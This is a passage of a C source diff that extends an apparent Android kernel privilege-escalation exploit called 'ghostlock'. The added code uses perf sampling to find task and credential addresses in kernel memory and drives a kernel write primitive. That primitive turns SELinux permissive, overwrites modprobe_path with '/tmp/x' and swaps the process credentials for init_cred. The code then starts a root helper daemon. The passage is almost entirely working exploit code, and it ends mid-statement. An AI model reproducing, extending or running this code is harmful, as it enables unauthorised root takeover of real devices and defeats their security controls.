@@ -14,6 +14,8 @@
 #include <sys/utsname.h>
 #include <poll.h>
 
+extern char **environ;
+
 const struct kernel_offsets *active_offsets = NULL;
 
 /* Override target.h _OFF macros with dynamic offsets from offsets.h table */
@@ -283,6 +285,7 @@ void *consumer_thread(void *arg __attribute__((unused))) {
 
 void reset_main_route_state(void) {
   f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
+  atomic_store(&cfi_stage_started, 0);
   atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
   atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
   atomic_store(&owner_stop, 0);
@@ -329,6 +332,9 @@ static atomic_int gk_t3_ready, gk_t1_holds_a, gk_t2_positioned;
 static atomic_int gk_t1_about_wait, gk_t1_done, gk_t1_timeout;
 static atomic_int gk_edeadlk, gk_release, gk_owner_has_lock;
 static atomic_int gk_waiter_tid, gk_fire_count;
+uintptr_t ghostlock_precomputed_task;
+uintptr_t ghostlock_precomputed_cred;
+static int perf_task_cand_votes[32];
 
 static void *sync_waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
@@ -413,6 +419,24 @@ static void *sync_consumer_thread(void *arg __attribute__((unused))) {
     pr_warning("sync consumer sched_setaffinity cpu=%d failed errno=%d\n",
                consumer_core, errno);
   }
+  if (getenv("CFI_PRECOMPUTE_CRED")) {
+    uintptr_t cred = 0;
+    int cred_votes = 0;
+    for (int attempt = 0; attempt < 5; attempt++) {
+      cred = ghostlock_perf_current_cred();
+      cred_votes = perf_task_cand_votes[0];
+      if (cred && cred_votes >= 3) break;
+    }
+    __atomic_store_n(&ghostlock_precomputed_cred, cred, __ATOMIC_RELEASE);
+    pr_info("sync consumer precomputed cred=%016zx votes=%d\n",
+            cred, cred_votes);
+    if (!cred) return NULL;
+  } else if (getenv("CFI_PRECOMPUTE_TASK")) {
+    uintptr_t task = ghostlock_perf_current_task();
+    __atomic_store_n(&ghostlock_precomputed_task, task, __ATOMIC_RELEASE);
+    pr_info("sync consumer precomputed task=%016zx\n", task);
+    if (!task) return NULL;
+  }
   atomic_store(&gk_t3_ready, 1);
   int fire_once = 0;
   for (;;) {
@@ -457,6 +481,13 @@ static void *sync_consumer_thread(void *arg __attribute__((unused))) {
       pr_info("sync punch sched_setattr failed errno=%d\n", punch_errno);
     } else {
       atomic_fetch_add(&gk_fire_success, 1);
+      if (getenv("CFI_STAGE_IN_CONSUMER") &&
+          !pselect_custom_write_enabled() &&
+          !atomic_load(&cfi_stage_done)) {
+        int stage_ok = try_cfi_stage();
+        pr_info("sync consumer cfi stage=%d step=%d errno=%d\n",
+                stage_ok, cfi_last_step, cfi_last_errno);
+      }
     }
     atomic_store(&gk_route_done, 1);
     fire_once = 1;
@@ -559,18 +590,24 @@ int run_sync_route(void) {
           delay_source, delay_index);
 
   pthread_t waiter, owner, consumer;
+  int consumer_rc = pthread_create(&consumer, NULL, sync_consumer_thread, NULL);
+  if (consumer_rc != 0)
+    pr_error("sync consumer thread create failed rc=%d\n", consumer_rc);
+
+  /* A precomputed task sample can take much longer than the waiter's 50 ms
+   * futex timeout. Finish consumer setup before starting the timed route. */
+  while (!atomic_load(&gk_t3_ready)) {
+    usleep(1000);
+  }
+
   int waiter_rc = pthread_create(&waiter, NULL, sync_waiter_thread, NULL);
   if (waiter_rc != 0)
     pr_error("sync waiter thread create failed rc=%d\n", waiter_rc);
   int owner_rc = pthread_create(&owner, NULL, sync_owner_thread, NULL);
   if (owner_rc != 0)
     pr_error("sync owner thread create failed rc=%d\n", owner_rc);
-  int consumer_rc = pthread_create(&consumer, NULL, sync_consumer_thread, NULL);
-  if (consumer_rc != 0)
-    pr_error("sync consumer thread create failed rc=%d\n", consumer_rc);
 
-  while (!atomic_load(&gk_t1_about_wait) || !atomic_load(&gk_t2_positioned) ||
-         !atomic_load(&gk_t3_ready)) {
+  while (!atomic_load(&gk_t1_about_wait) || !atomic_load(&gk_t2_positioned)) {
     usleep(1000);
   }
 
@@ -600,7 +637,15 @@ int run_sync_route(void) {
     pr_info("sync route EDEADLK handoff waiter_done=%d owner_lock=%d\n",
             atomic_load(&gk_t1_done), atomic_load(&gk_owner_has_lock));
     atomic_store(&gk_edeadlk, 1);
-    while (!atomic_load(&gk_t1_done)) usleep(1000);
+    for (;;) {
+      if (atomic_load(&gk_t1_done)) break;
+      if (getenv("RB_CRED_ONLY") && getuid() == 0) {
+        pr_success("sync RB_CRED_ONLY observed uid=0 before route join\n");
+        atomic_store(&gk_release, 1);
+        return 1;
+      }
+      usleep(1000);
+    }
     pr_info("sync route waiter done timeout=%d window=%d step=%d errno=%d\n",
             atomic_load(&gk_t1_timeout), atomic_load(&gk_window_hit),
             cfi_last_step, cfi_last_errno);
@@ -619,14 +664,15 @@ int run_sync_route(void) {
   return ok;
 }
 
-static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
+static int do_one_write_value(
+    uintptr_t target, uintptr_t value, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
   /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
    * case 1 then makes __rb_change_child() write parent->rb_right (= target)
    * with the erased node's rb_right value: fake_left is always NULL so case 1
    * always fires, and the erased node is RED so no color fixup runs. */
   pselect_child_node = leaf ? 0 : 1;
-  set_pselect_write_mode(target, 0, mode);
+  set_pselect_write_mode(target, value, mode);
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
@@ -639,6 +685,10 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
     pr_warning("  PI route did not produce a verified write\n");
   }
   return routed;
+}
+
+static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
+  return do_one_write_value(target, 0, desc, mode, leaf);
 }
 
 static int check_selinux_off(void) {
@@ -730,6 +780,47 @@ static const char *local_root_helper_path(void) {
   return DEFAULT_LOCAL_ROOT_HELPER_PATH;
 }
 
+static int start_root_daemon(const char *allowed_uid) {
+  const char *helper_path = local_root_helper_path();
+  unlink(LOCAL_ROOT_SOCKET);
+  pid_t helper = fork();
+  if (helper == 0) {
+    setsid();
+    int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
+    if (null_fd >= 0) {
+      dup2(null_fd, STDIN_FILENO);
+      dup2(null_fd, STDOUT_FILENO);
+      dup2(null_fd, STDERR_FILENO);
+      if (null_fd > STDERR_FILENO) close(null_fd);
+    }
+    for (int fd = 3; fd < 1024; fd++) {
+      int fl = fcntl(fd, F_GETFD);
+      if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
+    }
+    char *const helper_argv[] = {
+        "ghostlock-helper", "--umh", (char *)allowed_uid, NULL
+    };
+    execve(helper_path, helper_argv, environ);
+    _exit(127);
+  }
+  if (helper < 0) return 0;
+
+  for (int i = 0; i < 50; i++) {
+    if (access(LOCAL_ROOT_SOCKET, F_OK) == 0) return 1;
+    int status = 0;
+    if (waitpid(helper, &status, WNOHANG) == helper) return 0;
+    usleep(100000);
+  }
+  return 0;
+}
+
+int ghostlock_start_root_daemon_early(void) {
+  const char *allowed_env = getenv("GHOSTLOCK_ALLOWED_UID");
+  const char *allowed_uid =
+      (allowed_env && allowed_env[0]) ? allowed_env : "2000";
+  return start_root_daemon(allowed_uid);
+}
+
 static void init_runtime_paths(void) {
   const char *home = getenv("GHOSTLOCK_HOME");
   if (!home || !home[0]) home = getenv("TMPDIR");
@@ -743,6 +834,25 @@ static void init_runtime_paths(void) {
   snprintf(g_root_script_path, sizeof(g_root_script_path),
            "%s/.ghostlock_root.sh", g_home_dir);
   pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
+}
+
+static void init_durable_log(void) {
+  const char *path = getenv("GHOSTLOCK_LOG");
+  if (!path || !path[0]) return;
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC | O_CLOEXEC,
+                0600);
+  if (fd < 0) {
+    pr_warning("durable log open failed path=%s errno=%d\n", path, errno);
+    return;
+  }
+  dup2(fd, STDOUT_FILENO);
+  dup2(fd, STDERR_FILENO);
+  if (fd > STDERR_FILENO) close(fd);
+  if (getenv("GHOSTLOCK_UNBUFFERED")) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+  }
+  pr_info("durable log path=%s\n", path);
 }
 
 static void write_root_script(void) {
@@ -899,7 +1009,20 @@ static int root_shell_requested(int argc, char **argv) {
   return env && env[0] && strcmp(env, "0") != 0;
 }
 
-/* Find a task through perf sample records. */
+#define PERF_TASK_MAX_CANDS 32
+
+struct task_report {
+  int ncands;
+  int pad;
+  uintptr_t cands[PERF_TASK_MAX_CANDS];
+};
+
+static int perf_task_ncands;
+static uintptr_t perf_task_cands[PERF_TASK_MAX_CANDS];
+
+/* Find a task through perf sample records. Hammering PR_SET_NAME keeps
+ * both current and current->comm in the sampled kernel registers, which
+ * lets the parent validate a task base against its comm address. */
 static uintptr_t perf_find_task(void) {
   struct perf_event_attr pe;
   memset(&pe, 0, sizeof(pe));
@@ -928,7 +1051,20 @@ static uintptr_t perf_find_task(void) {
     return 0;
   }
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
+  int sample_getuid_all = getenv("PERF_GETUID_ALL") != NULL;
+  int sample_getuid =
+      sample_getuid_all || getenv("PERF_GETUID") != NULL;
+  int sample_getpid = getenv("PERF_TASK_GETPID") != NULL;
+  int sample_iterations = sample_getuid ? 2000000 : 500000;
+  for (volatile int i = 0; i < sample_iterations; i++) {
+    if (sample_getuid) {
+      syscall(__NR_getuid);
+    } else if (sample_getpid) {
+      syscall(__NR_getpid);
+    } else {
+      syscall(__NR_prctl, PR_SET_NAME, "e", 0, 0, 0);
+    }
+  }
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
   struct perf_event_mmap_page *hdr = buf;
   uint64_t head = hdr->data_head;
@@ -942,14 +1078,45 @@ static uintptr_t perf_find_task(void) {
     if (ev->size == 0) break;
     if (ev->type == PERF_RECORD_SAMPLE) {
       char *p = (char *)ev + sizeof(*ev);
-      p += 8; /* skip IP */
+      uint64_t sample_ip = *(uint64_t *)p;
+      p += 8;
       uint64_t abi = *(uint64_t *)p; p += 8;
       if (abi == 1 || abi == 2) {
         uint64_t *regs = (uint64_t *)p;
-        for (int i = 0; i < 32 && nc < 256; i++) {
-          uint64_t v = regs[i];
-          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
-            cands[nc++] = v;
+        if (sample_getpid) {
+          uintptr_t getpid_entry =
+              text_addr(KIMAGE_TEXT_BASE + 0x000ce5e4ULL);
+          uintptr_t task_pid_ns_entry =
+              text_addr(KIMAGE_TEXT_BASE + 0x000dc658ULL);
+          if ((sample_ip >= getpid_entry + 0x18 &&
+               sample_ip < getpid_entry + 0x1c) ||
+              (sample_ip >= task_pid_ns_entry + 0x1c &&
+               sample_ip < task_pid_ns_entry + 0xc8)) {
+            uint64_t v =
+                sample_ip < task_pid_ns_entry
+                    ? regs[0]
+                    : regs[21];
+            if (v > 0xffffff8000000000ULL && v < 0xffffffc000000000ULL)
+              cands[nc++] = v;
+          }
+        } else if (sample_getuid) {
+          /* x8 holds current->cred in the getuid sample window. The ALL
+           * variant widens only the PC filter, never the register set. */
+          uintptr_t getuid_entry =
+              text_addr(KIMAGE_TEXT_BASE + 0x000ce68cULL);
+          if (sample_getuid_all ||
+              (sample_ip >= getuid_entry + 0xc &&
+               sample_ip < getuid_entry + 0x14)) {
+            uint64_t v = regs[8];
+            if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
+              cands[nc++] = v;
+          }
+        } else {
+          for (int i = 0; i < 32 && nc < 256; i++) {
+            uint64_t v = regs[i];
+            if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
+              cands[nc++] = v;
+          }
         }
       }
     }
@@ -957,14 +1124,48 @@ static uintptr_t perf_find_task(void) {
   }
   hdr->data_tail = head; munmap(buf, msz); close(fd);
   if (!nc) return 0;
-  uintptr_t best = 0; int best_cnt = 0;
-  for (int i = 0; i < nc; i++) {
-    int cnt = 0;
-    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
-    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
+  perf_task_ncands = 0;
+  for (;;) {
+    uintptr_t best = 0;
+    int best_cnt = 0;
+    for (int i = 0; i < nc; i++) {
+      int picked = 0;
+      for (int j = 0; j < perf_task_ncands; j++) {
+        if (perf_task_cands[j] == cands[i]) {
+          picked = 1;
+          break;
+        }
+      }
+      if (picked) continue;
+      int cnt = 0;
+      for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
+      if (cnt > best_cnt) {
+        best_cnt = cnt;
+        best = cands[i];
+      }
+    }
+    if (!best) break;
+    perf_task_cands[perf_task_ncands] = best;
+    perf_task_cand_votes[perf_task_ncands] = best_cnt;
+    perf_task_ncands++;
+    if (perf_task_ncands >= PERF_TASK_MAX_CANDS) break;
   }
-  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
-  return best;
+  for (int i = 0; i < perf_task_ncands; i++) {
+    pr_info("perf cand[%d]: 0x%016zx (%d/%d votes)\n", i,
+            perf_task_cands[i], perf_task_cand_votes[i], nc);
+  }
+  return perf_task_cands[0];
+}
+
+uintptr_t ghostlock_perf_current_cred(void) {
+  setenv("PERF_GETUID", "1", 1);
+  return perf_find_task();
+}
+
+uintptr_t ghostlock_perf_current_task(void) {
+  unsetenv("PERF_GETUID");
+  setenv("PERF_TASK_GETPID", "1", 1);
+  return perf_find_task();
 }
 
 struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
@@ -991,10 +1192,18 @@ static void child_main(struct child_pipes *p) {
   sa.sa_flags = SA_SIGINFO;
   sigemptyset(&sa.sa_mask);
   sigaction(SIGSYS, &sa, NULL);
-  uintptr_t my_task = perf_find_task();
-  write(p->task_w, &my_task, sizeof(my_task));
+  int no_perf = getenv("CHILD_NOPERF") != NULL;
+  uintptr_t my_task = no_perf ? 0 : perf_find_task();
+  struct task_report taskrep;
+  memset(&taskrep, 0, sizeof(taskrep));
+  if (!no_perf) {
+    taskrep.ncands = my_task ? perf_task_ncands : 0;
+    memcpy(taskrep.cands, perf_task_cands, sizeof(taskrep.cands));
+  }
+  prctl(PR_SET_NAME, "ghostleaf_0123456789");
+  write(p->task_w, &taskrep, sizeof(taskrep));
   close(p->task_w);
-  if (!my_task) _exit(1);
+  if (!no_perf && !my_task) _exit(1);
   char cmd;
   while (read(p->cmd_r, &cmd, 1) == 1) {
     if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
@@ -1062,6 +1271,13 @@ static void child_main(struct child_pipes *p) {
       uint32_t report =
         ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
       write(p->uid_w, &report, sizeof(report));
+    }
+    else if (cmd == 'R') {
+      const char *allowed_env = getenv("GHOSTLOCK_ALLOWED_UID");
+      const char *allowed_uid =
+          (allowed_env && allowed_env[0]) ? allowed_env : "2000";
+      uint32_t daemon_ready = start_root_daemon(allowed_uid);
+      write(p->uid_w, &daemon_ready, sizeof(daemon_ready));
     }
     else if (cmd == 'G' || cmd == 'X') break;
   }
@@ -1247,6 +1463,7 @@ int run_exploit(int argc, char **argv) {
   signal(SIGPIPE, SIG_IGN);
   set_limit();
   init_runtime_paths();
+  init_durable_log();
 
   if (!active_offsets && select_offsets() < 0) return 1;
 
@@ -1281,22 +1498,68 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
+  if (getenv("KSNITCH_ONLY")) {
+    slab_drain();
+    uintptr_t base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+    pr_success("KSNITCH_ONLY base=%016zx\n", base);
+    close_reclaim_sockets();
+    return base ? 0 : 1;
+  }
+
+  if (getenv("MODPROBE_ONLY")) {
+    uintptr_t modprobe_path = text_addr(KIMAGE_TEXT_BASE + 0x020d2458ULL);
+    uint64_t new_path = 0x0000782f706d742fULL; /* "/tmp/x" */
+    int wrote = 0;
+    for (int attempt = 1; attempt <= 12 && !wrote; attempt++) {
+      pr_info("MODPROBE_ONLY attempt %d/12 target=0x%016zx\n",
+              attempt, modprobe_path);
+      slab_drain();
+      wrote = do_one_write_value(
+          modprobe_path, new_path, "modprobe_path=/tmp/x", 3, 0);
+      if (!wrote) usleep(50000);
+    }
+    pr_success("MODPROBE_ONLY complete wrote=%d\n", wrote);
+    return wrote ? 0 : 1;
+  }
+
   /* W1: disable SELinux before task discovery. untrusted_app may not be able
    * to read enforce while it is still enforcing, so attempt W1 regardless.
    * UMH-root devices write permissive inside the UMH staging instead, right
    * before queueing the work item (shortest permissive window,
    * no separate W1 route cycle). */
-  int selinux_ok = check_selinux_off();
+  int perf_only = getenv("PERF_ONLY") != NULL;
+  int cfi_after_selinux = getenv("CFI_AFTER_SELINUX") != NULL;
+  int cfi_only = getenv("CFI_ONLY") != NULL ||
+                 getenv("CFI_CRED_ONLY") != NULL ||
+                 getenv("CFI_TASK_ONLY") != NULL;
+  cfi_only = cfi_only && !cfi_after_selinux;
+  int selinux_ok = (perf_only || cfi_only) ? 1 : check_selinux_off();
   if (active_offsets->umh_root) {
     pr_info("UMH device: SELinux permissive deferred to the UMH stage\n");
+  } else if (perf_only || cfi_only) {
+    pr_info("%s: skipping SELinux write\n",
+            cfi_only ? "CFI_ONLY" : "PERF_ONLY");
   } else if (!selinux_ok) {
     if (!enforce_readable()) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
     }
     TIMER("pre-W1 drain");
-    selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 8, 100000,
-        verify_selinux_stage, NULL, 0);
+    uintptr_t selinux_target = text_addr(SELINUX_ENFORCING);
+    int rb_mode = getenv("RB_CRED_ONLY") != NULL;
+    int one_w1 = rb_mode || cfi_after_selinux;
+    int side_count = one_w1 ? 1 : 2;
+    int route_attempts = one_w1 ? 1 : 8;
+    for (int side = 0; side < side_count && !selinux_ok; side++) {
+      uintptr_t target = selinux_target - (uintptr_t)(side * 8);
+      if (cfi_after_selinux) {
+        const char *w1_delay = getenv("W1_DELAY_USEC");
+        setenv("FOPS_DELAY_USEC", w1_delay && *w1_delay ? w1_delay : "40000",
+               1);
+      }
+      selinux_ok = retry_write_stage(
+          side ? "W1b: SELinux shifted" : "W1a: SELinux",
+          target, 1, route_attempts, 100000, verify_selinux_stage, NULL, 0);
+    }
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
       return 1;
@@ -1305,6 +1568,174 @@ int run_exploit(int argc, char **argv) {
   } else {
     pr_success("SELinux already permissive\n");
   }
+  if (getenv("SELINUX_ONLY")) {
+    pr_success("SELINUX_ONLY complete enforce_off=%d\n", check_selinux_off());
+    return check_selinux_off() ? 0 : 1;
+  }
+
+  if (getenv("RB_CRED_ONLY")) {
+    char allowed_uid[16];
+    snprintf(allowed_uid, sizeof(allowed_uid), "%u", getuid());
+    uintptr_t task = ghostlock_perf_current_task();
+    const char *side_value = getenv("RB_CRED_SIDE");
+    char *side_end = NULL;
+    long side = side_value && *side_value ? strtol(side_value, &side_end, 0) : 0;
+    if (!side_value || !*side_value || *side_end || side < 0 || side > 1) {
+      pr_error("RB_CRED_ONLY invalid RB_CRED_SIDE=%s (expected 0 or 1)\n",
+               side_value ? side_value : "");
+      return 1;
+    }
+    pr_info("RB_CRED_ONLY task=%016zx side=%ld\n", task, side);
+    if (!task || !is_direct_ptr(task) || (task & 0x3f)) return 1;
+    uintptr_t target = task + TASK_CRED_OFF - (uintptr_t)(side * 8);
+    pr_info("RB_CRED_ONLY target=%016zx\n", target);
+    slab_drain();
+    int routed = do_one_write_value(
+        target, text_addr(INIT_CRED), "rb init_cred", 2, 0);
+    pr_info("RB_CRED_ONLY route=%d uid=%d\n", routed, getuid());
+    if (getuid() == 0) {
+      /* copy_creds() gives a normal forked child a consistent credential pair
+       * copied from current->cred. The parent remains inconsistent and must
+       * never reach commit_creds(); it parks after launching the helper. */
+      int daemon_ready = start_root_daemon(allowed_uid);
+      pr_success("RB_CRED_ONLY root daemon=%d uid=%d selinux=%d\n",
+                 daemon_ready, getuid(), check_selinux_off());
+      if (daemon_ready) {
+        for (;;) sleep(60);
+      }
+      return 1;
+    }
+    return 1;
+  }
+
+  if (getenv("CFI_TASK_ONLY")) {
+    char allowed_uid[16];
+    snprintf(allowed_uid, sizeof(allowed_uid), "%u", getuid());
+    setenv("GHOSTLOCK_ALLOWED_UID", allowed_uid, 1);
+    setenv("CFI_BOOTSTRAP", "canon", 1);
+    setenv("CFI_STAGE_IN_CONSUMER", "1", 1);
+    int inplace_cred = getenv("CFI_INPLACE_SELF_CRED") != NULL;
+    setenv(inplace_cred ? "CFI_SELF_PERF_CRED" : "CFI_SELF_PERF_TASKSWAP",
+           "1", 1);
+    if (inplace_cred) {
+      setenv("CFI_BLIND_CRED", "1", 1);
+    }
+    if (cfi_after_selinux) {
+      setenv(inplace_cred ? "CFI_PRECOMPUTE_CRED" : "CFI_PRECOMPUTE_TASK",
+             "1", 1);
+      const char *cfi_delay = getenv("CFI_DELAY_USEC");
+      setenv("FOPS_DELAY_USEC", cfi_delay && *cfi_delay ? cfi_delay : "50000",
+             1);
+    }
+    const char *bootstrap = getenv("CFI_BOOTSTRAP");
+    const char *delay = getenv("FOPS_DELAY_USEC");
+    pr_info("CFI_TASK_ONLY self-route bootstrap=%s delay=%s allowed_uid=%s\n",
+            bootstrap ? bootstrap : "default",
+            delay ? delay : "default", allowed_uid);
+    slab_drain();
+    int routed = do_one_write(0, "CFI self patch", 0, 0);
+    pr_info("CFI_TASK_ONLY route=%d cfi=%d step=%d errno=%d\n",
+            routed, atomic_load(&cfi_stage_done), cfi_last_step,
+            cfi_last_errno);
+
+    int root_uid = getuid();
+    int task_selinux_ok = check_selinux_off();
+    pr_info("CFI_TASK_ONLY self uid=%d selinux_ok=%d\n",
+            root_uid, task_selinux_ok);
+    if (root_uid != 0 || !task_selinux_ok) return 1;
+
+    int daemon_ready = start_root_daemon(allowed_uid);
+    pr_success("CFI_TASK_ONLY root daemon=%d uid=%d selinux=%d\n",
+               daemon_ready, getuid(), check_selinux_off());
+    return daemon_ready ? 0 : 1;
+  }
+
+  if (getenv("CFI_CRED_ONLY")) {
+    setenv("PERF_GETUID", "1", 1);
+    setenv("CFI_STAGE_IN_CONSUMER", "1", 1);
+    setenv("CFI_BLIND_CRED", "1", 1);
+    struct child_pipes pipes;
+    pid_t child = spawn_child(&pipes);
+    if (child < 0) {
+      pr_warning("CFI_CRED_ONLY fork failed\n");
+      return 1;
+    }
+
+    struct task_report report;
+    memset(&report, 0, sizeof(report));
+    if (read(pipes.task_r, &report, sizeof(report)) !=
+        (ssize_t)sizeof(report)) {
+      pr_warning("CFI_CRED_ONLY no perf report\n");
+      kill(-child, SIGKILL);
+      waitpid(child, NULL, 0);
+      return 1;
+    }
+    close(pipes.task_r);
+    pr_info("CFI_CRED_ONLY child=%d candidates=%d\n", child, report.ncands);
+
+    int root_ok = 0;
+    for (int i = 0; i < report.ncands && !root_ok; i++) {
+      uintptr_t cand = report.cands[i];
+      if (cand < 0xffffff8000000000ULL ||
+          cand >= 0xffffffc000000000ULL || (cand & 3)) {
+        continue;
+      }
+      char cred_hex[32];
+      snprintf(cred_hex, sizeof(cred_hex), "0x%016zx", cand);
+      setenv("CFI_PATCH_CRED", cred_hex, 1);
+      pr_info("CFI_CRED_ONLY candidate=%d/%d cred=%s\n",
+              i + 1, report.ncands, cred_hex);
+      slab_drain();
+      int routed = do_one_write(0, "CFI direct cred", 0, 0);
+      pr_info("CFI_CRED_ONLY route=%d cfi=%d step=%d errno=%d\n",
+              routed, atomic_load(&cfi_stage_done), cfi_last_step,
+              cfi_last_errno);
+      if (atomic_load(&cfi_stage_done)) {
+        struct w2_stage_context cred_context = { .pipes = &pipes };
+        root_ok = verify_w2_stage(&cred_context);
+      }
+    }
+
+    if (root_ok) {
+      pr_success("CFI_CRED_ONLY child uid=0; running root setup\n");
+      write(pipes.cmd_w, "G", 1);
+      struct pollfd pfd = { .fd = pipes.uid_r, .events = POLLIN };
+      uint32_t root_report = 0;
+      int got = poll(&pfd, 1, 60000);
+      ssize_t nr = got > 0 ? read(pipes.uid_r, &root_report,
+                                  sizeof(root_report)) : -1;
+      pr_success("CFI_CRED_ONLY root setup report=%u read=%zd poll=%d\n",
+                 root_report, nr, got);
+      close(pipes.cmd_w);
+      close(pipes.uid_r);
+      waitpid(child, NULL, 0);
+      return 0;
+    }
+
+    pr_warning("CFI_CRED_ONLY no credential candidate became root\n");
+    unsetenv("CFI_PATCH_CRED");
+    kill(-child, SIGKILL);
+    waitpid(child, NULL, 0);
+    close(pipes.cmd_w);
+    close(pipes.uid_r);
+    return 1;
+  }
+
+  if (getenv("CFI_ONLY")) {
+    int cfi_ok = 0;
+    for (int attempt = 1; attempt <= 6 && !cfi_ok; attempt++) {
+      pr_info("CFI_ONLY bootstrap attempt %d/6\n", attempt);
+      slab_drain();
+      int routed = do_one_write(0, "CFI_ONLY bootstrap", 0, 0);
+      cfi_ok = atomic_load(&cfi_stage_done) != 0;
+      pr_info("CFI_ONLY attempt %d routed=%d cfi=%d step=%d errno=%d\n",
+              attempt, routed, cfi_ok, cfi_last_step, cfi_last_errno);
+      if (!cfi_ok && !routed) usleep(100000);
+    }
+    pr_success("CFI_ONLY complete cfi=%d step=%d errno=%d\n",
+               cfi_ok, cfi_last_step, cfi_last_errno);
+    return cfi_ok ? 0 : 1;
+  }
 
   if (active_offsets->umh_root) {
     /* KDP_CRED devices: never rewrite creds.  Run the route once without a
@@ -1312,9 +1743,10 @@ int run_exploit(int argc, char **argv) {
      * configfs arbitrary write, then install_android_root() ->
      * install_workqueue_umh_root() writes SELinux permissive and queues
      * the dedicated local helper as the kernel-spawned process. */
+    setenv("CFI_STAGE_IN_CONSUMER", "1", 1);
     int umh_ok = 0;
-    for (int attempt = 1; attempt <= 6 && !umh_ok; attempt++) {
-      pr_info("UMH bootstrap attempt %d/6\n", attempt);
+    for (int attempt = 1; attempt <= 1 && !umh_ok; attempt++) {
+      pr_info("UMH bootstrap attempt %d/1\n", attempt);
       slab_drain();
       umh_ok = do_one_write(0, "UMH bootstrap", 0, 0);
       if (!umh_ok) {
@@ -1387,8 +1819,10 @@ int run_exploit(int argc, char **argv) {
       return 1;
     }
 
-    child_task = 0;
-    read(pipes.task_r, &child_task, sizeof(child_task));
+    struct task_report report;
+    memset(&report, 0, sizeof(report));
+    read(pipes.task_r, &report, sizeof(report));
+    child_task = report.ncands > 0 ? report.cands[0] : 0;
     close(pipes.task_r);
     TIMER("perf_find_task done");
 
@@ -1398,8 +1832,9 @@ int run_exploit(int argc, char **argv) {
       waitpid(child, NULL, 0);
       child = spawn_child(&pipes);
       if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
-      child_task = 0;
-      read(pipes.task_r, &child_task, sizeof(child_task));
+      memset(&report, 0, sizeof(report));
+      read(pipes.task_r, &report, sizeof(report));
+      child_task = report.ncands > 0 ? report.cands[0] : 0;
       close(pipes.task_r);
     }
 
@@ -1410,18 +1845,187 @@ int run_exploit(int argc, char **argv) {
       return 1;
     }
 
-    pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
+    int cred_sample_mode =
+        getenv("PERF_GETUID") != NULL || getenv("PERF_GETUID_ALL") != NULL;
+    /* A task base is the only candidate whose comm field also appears in
+     * the sampled register set. Prefer that device-proven pair. */
+    int task_candidate = -1;
+    if (!cred_sample_mode) {
+      for (int i = 0; i < report.ncands; i++) {
+        for (int j = 0; j < report.ncands; j++) {
+          if (report.cands[j] == report.cands[i] + TASK_COMM_OFF) {
+            task_candidate = i;
+            break;
+          }
+        }
+        if (task_candidate >= 0) break;
+      }
+    }
+    if (task_candidate < 0) {
+      pr_warning("perf comm-pair validation found no task base; using top hit\n");
+      task_candidate = 0;
+    } else {
+      child_task = report.cands[task_candidate];
+    }
+    pr_info("child_pid=%d %s=0x%016zx candidate=%d/%d\n",
+            child, cred_sample_mode ? "cred_candidate" : "child_task",
+            child_task, task_candidate + 1, report.ncands);
     pselect_child_node = 1;
+    if (getenv("PERF_ONLY")) {
+      close(pipes.cmd_w);
+      close(pipes.uid_r);
+      kill(-child, SIGKILL);
+      waitpid(child, NULL, 0);
+      pr_success("PERF_ONLY complete; no kernel write attempted\n");
+      return 0;
+    }
+    const char *comm_probe_env = getenv("COMM_PROBE");
+    if (comm_probe_env) {
+      int probe_mode = atoi(comm_probe_env);
+      int probe_leaf = probe_mode == 1;
+      struct w3_stage_context probe_context = {
+        .pipes = &pipes,
+        .leaf_to_target8 = 1,
+      };
+      slab_drain();
+      int routed = do_one_write(
+          child_task + TASK_COMM_OFF, "COMM probe", probe_mode, probe_leaf);
+      int probe_ok = 0;
+      if (routed && probe_mode == 1) {
+        probe_ok = verify_leaf_dir_stage(&probe_context);
+      } else if (routed) {
+        usleep(50000);
+        char path[64];
+        unsigned char cb[16] = {0};
+        snprintf(path, sizeof(path), "/proc/%d/comm", child);
+        int cfd = open(path, O_RDONLY | O_CLOEXEC);
+        if (cfd >= 0) {
+          ssize_t nr = read(cfd, cb, sizeof(cb));
+          close(cfd);
+          pr_info("mode2 comm bytes n=%zd: %02x %02x %02x %02x "
+                  "%02x %02x %02x %02x\n", nr,
